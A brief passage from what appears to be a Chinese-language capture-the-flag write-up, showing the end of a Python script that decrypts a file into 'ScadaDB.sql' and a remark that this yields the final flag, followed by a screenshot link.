output_file = "ScadaDB.sql"  # 解密后的文件
decrypt_file(input_file, output_file)

```

得到最后一个flag

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260110215141083.png)



